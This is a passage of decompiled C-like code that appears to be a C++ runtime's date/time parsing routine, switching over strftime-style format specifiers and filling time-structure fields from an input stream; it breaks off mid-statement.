(**(*piVar15 + 0x48))();\n                            if (uVar13 == -1) {\n                                uStack392 = NULL;\n                                piVar15 = NULL;\n                            }\n                            goto code_r0x000140034352;\n                        }\n                        if ((*(arg1_00[6] + *puVar9 * 2) & 0x20) == 0) goto code_r0x000140034317;\ncode_r0x00014003436d:\n                        piVar15[2] = puVar9 + 1;\n                    }\n                    uStack384 = 0xffffffff;\n                    uVar11 = 0xffffffff;\n                    ppiVar24 = in_stack_fffffffffffffe18;\n                } while( true );\n            }\n            cVar21 = uStack392 != NULL;\n            cVar2 = (**(*arg1_00 + 0x20))(arg1_00);\n            bVar10 = bVar20 && cVar21;\n            if ((bVar10) && (cVar21 = bVar10,  piVar15[3] <= piVar15[2])) {\n                in_stack_fffffffffffffe38 = in_stack_fffffffffffffe38 & 0xffffffffffffff00 | bVar10;\n                iVar6 = (**(*piVar15 + 0x48))(piVar15);\n                if (iVar6 == -1) {\n                    piVar15 = NULL;\n                    uStack392 = NULL;\n                    cVar21 = '\\0';\n                }\n                else {\n                    cVar21 = in_stack_fffffffffffffe38;\n                }\n            }\n            cVar3 = (**(*arg1_00 + 0x20))();\n            if (cVar2 != cVar3) {\n                cVar2 = (**(*arg1_00 + 0x10))(arg1_00);\n                if ((((cVar21 != '\\0') && (bVar20)) && (piVar15[3] <= piVar15[2])) &&\n                   (iVar6 = (**(*piVar15 + 0x48))(piVar15),  iVar6 == -1)) {\n                    uStack392 = NULL;\n                }\n                cVar21 = (**(*arg1_00 + 0x10))();\n                piVar15 = uStack392;\n                if (cVar2 != cVar21) goto code_r0x0001400342fc;\n            }\ncode_r0x0001400343c0:\n            if (piVar15[2] < piVar15[3]) {\n                piVar15[2] = piVar15[2] + 1;\n            }\n            else {\n                (**(*piVar15 + 0x50))();\n            }\n            uStack384 = 0xffffffff;\n            uVar11 = 0xffffffff;\n            piVar25 = arg_80h;\n            goto code_r0x000140034317;\n        }\ncode_r0x000140034250:\n        if (uVar22 != 0x25) goto code_r0x000140034258;\n        uVar14 = uVar13 + 1;\n        uVar4 = *(in_stack_00000040 + 1 + uVar13);\n        uVar22 = *(arg1_00 + uVar4 + 0x139);\n        in_stack_fffffffffffffe18 = ppiVar24;\n        if (uVar22 == 0) {\n            uVar22 = uVar4;\n            if (*(*arg1_00 + 0x40) != 0x14002baf0) {\n                uVar22 = (**(*arg1_00 + 0x40))();\n                in_stack_fffffffffffffe18 = ppiVar24;\n            }\n            if (uVar22 != 0) {\n                *(arg1_00 + uVar4 + 0x139) = uVar22;\n                goto code_r0x000140034463;\n            }\ncode_r0x0001400342fc:\n            uStack368 = 4;\n            piVar15 = uStack392;\n            uVar23 = 4;\n            piVar25 = arg_80h;\n            goto code_r0x000140034317;\n        }\ncode_r0x000140034463:\n        uStack364 = 0;\n        if ((uVar22 == 0x45) || (uVar22 == 0x4f)) {\n            uVar14 = uVar13 + 2;\n            uVar4 = *(in_stack_00000040 + uVar14);\n            uVar22 = *(arg1_00 + uVar4 + 0x139);\n            if (uVar22 == 0) {\n                uVar22 = uVar4;\n                if (*(*arg1_00 + 0x40) != 0x14002baf0) {\n                    uVar22 = (**(*arg1_00 + 0x40))();\n                }\n                if (uVar22 == 0) goto code_r0x0001400342fc;\n                *(arg1_00 + uVar4 + 0x139) = uVar22;\n            }\n        }\n        piVar15 = uStack392;\n        bVar10 = piVar19 != NULL && bVar17;\n    // switch table (85 cases) at 0x14010b04c\n        switch(uVar22 - 0x25) {\n        case 0:\n            uVar13 = uVar11;\n            if ((uStack392 != NULL) && (bVar20)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uVar13 = *uStack392[2];\n                }\n                else {\n                    in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar22;\n                    uVar7 = (**(*uStack392 + 0x48))();\n                    uVar22 = in_stack_fffffffffffffe18;\n                    uVar13 = uVar7;\n                    if (uVar7 == 0xffffffff) {\n                        piVar15 = NULL;\n                        uStack392 = NULL;\n                    }\n                }\n            }\n            if (*(arg1_00 + 7) == '\\0') {\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar22;\n                fcn.14002b2c0(arg1_00);\n                cVar21 = in_stack_fffffffffffffe18;\n                if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                    cVar21 = (**(*arg1_00 + 0x30))();\n                }\n            }\n            else {\n                cVar21 = *(arg1_00 + 0x5e);\n            }\n            if (cVar21 != uVar13) {\n                uStack368 = 4;\n                uVar23 = 4;\n                piVar25 = arg_80h;\n                break;\n            }\n            goto code_r0x0001400343c0;\n        default:\n            goto code_r0x0001400342fc;\n        case 0x1c:\n        case 0x3c:\n            iVar1 = *(arg_88h + 0x10);\n            uStack280 = *(iVar1 + 0xa8);\n            uStack276 = *(iVar1 + 0xac);\n            uStack272 = *(iVar1 + 0xb0);\n            uStack268 = *(iVar1 + 0xb4);\n            uStack344 = *(iVar1 + 0x68);\n            uStack340 = *(iVar1 + 0x6c);\n            uStack336 = *(iVar1 + 0x70);\n            uStack332 = *(iVar1 + 0x74);\n            uStack328 = *(iVar1 + 0x78);\n            uStack324 = *(iVar1 + 0x7c);\n            uStack320 = *(iVar1 + 0x80);\n            uStack316 = *(iVar1 + 0x84);\n            uStack312 = *(iVar1 + 0x88);\n            uStack308 = *(iVar1 + 0x8c);\n            uStack304 = *(iVar1 + 0x90);\n            uStack300 = *(iVar1 + 0x94);\n            uStack296 = *(iVar1 + 0x98);\n            uStack292 = *(iVar1 + 0x9c);\n            uStack288 = *(iVar1 + 0xa0);\n            uStack284 = *(iVar1 + 0xa4);\n            uStack264 = *(iVar1 + 0xb8);\n            uStack260 = *(iVar1 + 0xbc);\n            uStack256 = *(iVar1 + 0xc0);\n            uStack252 = *(iVar1 + 0xc4);\n            pcStack360 = *(iVar1 + 0x58);\n            pcStack352 = *(iVar1 + 0x60);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140033230(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &pcStack360, 0xe, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                          in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, in_stack_fffffffffffffe38);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[6] = uStack364 % 7;\n            *in_stack_00000048 = *in_stack_00000048 | 2;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x1d:\n        case 0x3d:\n        case 0x43:\n            iVar1 = *(arg_88h + 0x10);\n            uStack216 = *(iVar1 + 0x158);\n            uStack212 = *(iVar1 + 0x15c);\n            uStack208 = *(iVar1 + 0x160);\n            uStack204 = *(iVar1 + 0x164);\n            uStack264 = *(iVar1 + 0x128);\n            uStack260 = *(iVar1 + 300);\n            uStack256 = *(iVar1 + 0x130);\n            uStack252 = *(iVar1 + 0x134);\n            uStack248 = *(iVar1 + 0x138);\n            uStack244 = *(iVar1 + 0x13c);\n            uStack240 = *(iVar1 + 0x140);\n            uStack236 = *(iVar1 + 0x144);\n            uStack232 = *(iVar1 + 0x148);\n            uStack228 = *(iVar1 + 0x14c);\n            uStack224 = *(iVar1 + 0x150);\n            uStack220 = *(iVar1 + 0x154);\n            uStack200 = *(iVar1 + 0x168);\n            uStack196 = *(iVar1 + 0x16c);\n            uStack192 = *(iVar1 + 0x170);\n            uStack188 = *(iVar1 + 0x174);\n            uStack184 = *(iVar1 + 0x178);\n            uStack180 = *(iVar1 + 0x17c);\n            uStack176 = *(iVar1 + 0x180);\n            uStack172 = *(iVar1 + 0x184);\n            uStack296 = *(iVar1 + 0x108);\n            uStack292 = *(iVar1 + 0x10c);\n            uStack288 = *(iVar1 + 0x110);\n            uStack284 = *(iVar1 + 0x114);\n            uStack280 = *(iVar1 + 0x118);\n            uStack276 = *(iVar1 + 0x11c);\n            uStack272 = *(iVar1 + 0x120);\n            uStack268 = *(iVar1 + 0x124);\n            uStack344 = *(iVar1 + 0xd8);\n            uStack340 = *(iVar1 + 0xdc);\n            uStack336 = *(iVar1 + 0xe0);\n            uStack332 = *(iVar1 + 0xe4);\n            uStack328 = *(iVar1 + 0xe8);\n            uStack324 = *(iVar1 + 0xec);\n            uStack320 = *(iVar1 + 0xf0);\n            uStack316 = *(iVar1 + 0xf4);\n            uStack312 = *(iVar1 + 0xf8);\n            uStack308 = *(iVar1 + 0xfc);\n            uStack304 = *(iVar1 + 0x100);\n            uStack300 = *(iVar1 + 0x104);\n            pcStack360 = *(iVar1 + 200);\n            pcStack352 = *(iVar1 + 0xd0);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140033230(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &pcStack360, 0x18, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                          in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, in_stack_fffffffffffffe38);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[4] = uStack364 % 0xc;\n            *in_stack_00000048 = *in_stack_00000048 | 0x408;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x1e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            *in_stack_00000048 = *in_stack_00000048 | 0x480;\n            in_stack_00000048[1] = uStack364;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x1f:\n            if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x0001400358ca:\n                pcStack352 = pcStack352 & 0xffffffffffffff00;\n                pcStack360 = 0x79252f64252f6d25;\n            }\n            else {\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.14002b2c0(arg1_00);\n                }\n                if (*(*arg1_00 + 0x38) == 0x14002ba80) goto code_r0x0001400358ca;\n                (**(*arg1_00 + 0x38))(arg1_00, 0x14010b034, 0x14010b03d, &pcStack360);\n            }\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            piStack432 = arg_80h;\n            goto code_r0x000140035502;\n        case 0x23:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[2] = uStack364;\n            *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x24:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[2] = uStack364 % 0xc;\n            *in_stack_00000048 = *in_stack_00000048 | 1;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x28:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[1] = uStack364;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x2d:\n            if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x000140034e32:\n                pcStack360 = pcStack360 & 0xffff000000000000 | 0x4d253a4825;\n            }\n            else {\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.14002b2c0(arg1_00);\n                }\n                if (*(*arg1_00 + 0x38) == 0x14002ba80) goto code_r0x000140034e32;\n                (**(*arg1_00 + 0x38))(arg1_00, 0x14010b03d, 0x14010b043, &pcStack360);\n            }\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x000140034e94;\n        case 0x2e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                *in_stack_00000038 = uStack364;\n            }\n            goto code_r0x000140034fe0;\n        case 0x2f:\n            if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x000140035012:\n                pcStack352 = pcStack352 & 0xffffffffffffff00;\n                pcStack360 = 0x53253a4d253a4825;\n            }\n            else {\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.14002b2c0(arg1_00);\n                }\n                if (*(*arg1_00 + 0x38) == 0x14002ba80) goto code_r0x000140035012;\n                (**(*arg1_00 + 0x38))(arg1_00, 0x14010b043, 0x14010b04c, &pcStack360);\n            }\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x000140034e94;\n        case 0x30:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffff00000000 | *in_stack_00000048;\n                uVar23 = (uStack364 & 0x3f) << 0x10 | 0x20;\n                uVar7 = *in_stack_00000048 & 0xffc0ffdf;\ncode_r0x000140035138:\n                *in_stack_00000048 = uVar23 | uVar7;\n                uStack392 = piStack408;\n                uStack384 = uStack400;\n            }\n            goto code_r0x000140034fe0;\n        case 0x32:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffff00000000 | *in_stack_00000048;\n                uVar23 = (uStack364 & 0x3f) << 0x10 | 0x40;\n                uVar7 = *in_stack_00000048 & 0xffc0ffbf;\n                goto code_r0x000140035138;\n            }\n            goto code_r0x000140034fe0;\n        case 0x33:\n            goto code_r0x00014003525a;\n        case 0x34:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                in_stack_00000038[5] = uStack364 - 0x76c;\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xf9 | 4;\n            }\ncode_r0x000140034fe0:\n            uVar11 = uStack384;\n            piVar15 = uStack392;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            piStack408 = uStack392;\n            uStack400 = uStack384;\n            break;\n        case 0x35:\n            uVar13 = uVar11;\n            if ((uStack392 != NULL) && (bVar20)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uVar13 = *uStack392[2];\n                }\n                else {\n                    uVar13 = (**(*uStack392 + 0x48))();\n                    if (uVar13 == -1) {\n                        uStack392 = NULL;\n                    }\n                }\n            }\n            if ((*(arg1_00[6] + (uVar13 & 0xff) * 2) & 1) == 0) goto code_r0x0001400342fc;\n            noname_8 = &uStack368;\n            in_stack_fffffffffffffe18 = &piStack440;\n            arg3 = &uStack424;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140033230(&piStack408, arg2, arg3, in_stack_fffffffffffffe18, &pcStack360, *0x14010ff00, 0xe, \n                          in_stack_00000028, noname_8, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                          in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, arg3);\n            cVar21 = uStack400 == 0xffffffff;\n            uStack392 = piStack408;\n            uVar11 = uStack400;\n            uStack384 = uStack400;\n            bVar20 = piStack408 != NULL && cVar21;\n            if (bVar20) {\n                if ((piStack408[2] < piStack408[3]) ||\n                   (cVar21 = bVar20,  iVar6 = (**(*piStack408 + 0x48))(),  iVar6 != -1)) {\n                    cVar21 = '\\0';\n                }\n                else {\n                    uStack392 = NULL;\n                }\n            }\n            if ((bVar10) && (bVar17 = false,  piVar19[3] <= piVar19[2])) {\n                iVar6 = (**(*piVar19 + 0x48))();\n                if (iVar6 == -1) {\n                    piVar19 = NULL;\n                }\n                bVar17 = iVar6 == -1 && bVar10;\n            }\n            piVar15 = uStack392;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            in_stack_fffffffffffffe38 = arg3;\n            if ((cVar21 != bVar17) && ((uStack368 | pcStack360) == 0)) {\n                cVar21 = fcn.140029e90(&uStack392);\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.14002b2c0(arg1_00);\n                    cVar2 = '-';\n                    if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                        cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n                    }\n                }\n                else {\n                    cVar2 = *(arg1_00 + 0x66);\n                }\n                if (cVar21 != cVar2) {\n                    cVar21 = fcn.140029e90(&uStack392);\n                    if (*(arg1_00 + 7) == '\\0') {\n                        fcn.14002b2c0(arg1_00);\n                        cVar2 = '+';\n                        if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                            cVar2 = (**(*arg1_00 + 0x30))();\n                        }\n                    }\n                    else {\n                        cVar2 = *(arg1_00 + 100);\n                    }\n                    if (cVar21 != cVar2) {\n                        uVar11 = uStack384;\n                        piVar15 = uStack392;\n                        uVar23 = 0;\n                        piVar25 = arg_80h;\n                        in_stack_fffffffffffffe38 = arg3;\n                        break;\n                    }\n                }\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piVar25 = arg_80h;\n                in_stack_fffffffffffffe38 = arg3;\n                piStack440 = piVar19;\n                piStack432 = arg_80h;\n                fcn.140032c50(&piStack408, arg2, arg3, in_stack_fffffffffffffe18);\n                uStack384 = uStack400;\n                uStack392 = piStack408;\n                uStack392._0_4_ = SUB84(piStack408, 0);\n                uStack392._4_4_ = piStack408 >> 0x20;\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack400;\n                uStack412 = uStack380;\n                piStack440 = piVar19;\n                piStack432 = arg_80h;\n                fcn.140032c50(&piStack408, arg2, arg3, in_stack_fffffffffffffe18);\n                uStack384 = uStack400;\n                uStack392 = piStack408;\n                uVar11 = uStack400;\n                piVar15 = piStack408;\n                in_stack_fffffffffffffe00 = noname_8;\n                uVar23 = uStack368;\n            }\n            break;\n        case 0x3e:\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            piStack432 = arg_80h;\ncode_r0x000140035502:\n            arg_80h = piStack432;\n            piStack440 = piVar19;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.1400340c0(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x3f:\n        case 0x40:\n            if ((uStack392 == NULL) || (!bVar20)) {\ncode_r0x000140034942:\n                if ((*(arg1_00[6] + (uVar11 & 0xff) * 2) & 0x20) != 0) {\n                    puVar9 = uStack392[2];\n                    if (puVar9 < uStack392[3]) goto code_r0x000140035eca;\n                    (**(*uStack392 + 0x50))();\ncode_r0x000140035ed2:\n                    uStack384 = 0xffffffff;\n                }\n            }\n            else {\n                puVar9 = uStack392[2];\n                if (uStack392[3] <= puVar9) {\n                    uVar23 = (**(*uStack392 + 0x48))();\n                    uVar11 = uVar23;\n                    if (uVar23 == 0xffffffff) {\n                        uStack392 = NULL;\n                    }\n                    goto code_r0x000140034942;\n                }\n                if ((*(arg1_00[6] + *puVar9 * 2) & 0x20) != 0) {\ncode_r0x000140035eca:\n                    uStack392[2] = puVar9 + 1;\n                    goto code_r0x000140035ed2;\n                }\n            }\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[3] = uStack364;\n            *in_stack_00000048 = *in_stack_00000048 | 0x410;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x45:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[7] = uStack364 - 1;\n            *in_stack_00000048 = *in_stack_00000048 | 4;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x48:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[4] = uStack364 - 1;\n            *in_stack_00000048 = *in_stack_00000048 | 8;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x49:\n        case 0x4f:\n            do {\n                uVar22 = uVar11 == -1;\n                uVar4 = piVar15 != NULL && uVar22;\n                if (uVar4) {\n                    if (piVar15[3] <= piVar15[2]) {\n                        in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar4;\n                        iVar6 = (**(*piVar15 + 0x48))();\n                        uVar22 = in_stack_fffffffffffffe18;\n                        uVar4 = uVar22;\n                        if (iVar6 == -1) {\n                            uVar4 = 0;\n                            uStack392 = NULL;\n                            piVar15 = NULL;\n                            goto code_r0x000140034bc0;\n                        }\n                    }\n                    uVar22 = 0;\n                }\ncode_r0x000140034bc0:\n                bVar20 = piVar19 != NULL && bVar17;\n                bVar10 = bVar17;\n                if (bVar20) {\n                    if (piVar19[2] < piVar19[3]) {\n                        bVar10 = false;\n                    }\n                    else {\n                        in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar4;\n                        iVar6 = (**(*piVar19 + 0x48))();\n                        uVar4 = in_stack_fffffffffffffe18;\n                        if (iVar6 == -1) {\n                            piVar19 = NULL;\n                        }\n                        bVar10 = iVar6 == -1 && bVar20;\n                    }\n                }\n                piVar25 = arg_80h;\n                if (uVar22 == bVar10) break;\n                uVar13 = uVar11;\n                if (uVar4 == 0) {\ncode_r0x000140034be6:\n                    piVar25 = arg_80h;\n                    if ((*(arg1_00[6] + (uVar13 & 0xff) * 2) & 0x20) == 0) break;\n                    puVar9 = piVar15[2];\n                    if (puVar9 < piVar15[3]) goto code_r0x000140034c05;\n                    (**(*piVar15 + 0x50))();\n                }\n                else {\n                    puVar9 = piVar15[2];\n                    if (piVar15[3] <= puVar9) {\n                        uVar13 = (**(*piVar15 + 0x48))();\n                        if (uVar13 == -1) {\n                            piVar15 = NULL;\n                            uStack392 = NULL;\n                        }\n                        goto code_r0x000140034be6;\n                    }\n                    if ((*(arg1_00[6] + *puVar9 * 2) & 0x20) == 0) break;\ncode_r0x000140034c05:\n                    piVar15[2] = puVar9 + 1;\n                }\n                uStack384 = 0xffffffff;\n                uVar11 = 0xffffffff;\n            } while( true );\n        case 0x4b:\n            pcStack360 = *(*(arg_88h + 0x10) + 0x40);\n            pcStack352 = *(*(arg_88h + 0x10) + 0x48);\n            piVar25 = arg_80h;\n            if ((*pcStack360 != '\\0') && (*pcStack352 != '\\0')) {\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piStack440 = piVar19;\n                piStack432 = arg_80h;\n                fcn.140033230(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &pcStack360, 2, in_stack_00000028\n                              , &uStack368, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                              in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, in_stack_fffffffffffffe38);\n                uStack392 = piStack408;\n                uStack384 = uStack400;\n                if ((uStack368 != 0) || (uStack364 == 0)) goto code_r0x000140034fe0;\n                uVar11 = uStack400;\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                piVar15 = piStack408;\n                uVar23 = uStack368;\n                piVar25 = arg_80h;\n            }\n            break;\n        case 0x4d:\n            goto code_r0x00014003525a;\n        case 0x52:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x000140034fe0;\n            uVar11 = uStack400;\n            in_stack_00000038[6] = uStack364;\n            *in_stack_00000048 = *in_stack_00000048 | 2;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x53:\ncode_r0x00014003525a:\n            uStack420 = uStack392._4_4_;\n            uStack424 = uStack392;\ncode_r0x000140034e94:\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.1400340c0(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uVar11 = uStack400;\n            uStack384 = uStack400;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x54:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.140032c50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            uVar23 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                bVar5 = piStack408 != NULL && uStack400 == 0xffffffff;\n                bVar20 = uStack400 == 0xffffffff;\n                if (bVar5) {\n                    if ((piStack408[2] < piStack408[3]) || (iVar6 = (**(*piStack408 + 0x48))(),  iVar6 != -1)) {\n                        bVar20 = false;\n                    }\n                    else {\n                        uStack392 = NULL;\n                        bVar20 = bVar5;\n                    }\n                }\n                bVar5 = bVar17;\n                bVar18 = bVar10;\n                if (((bVar10) && (bVar5 = false,  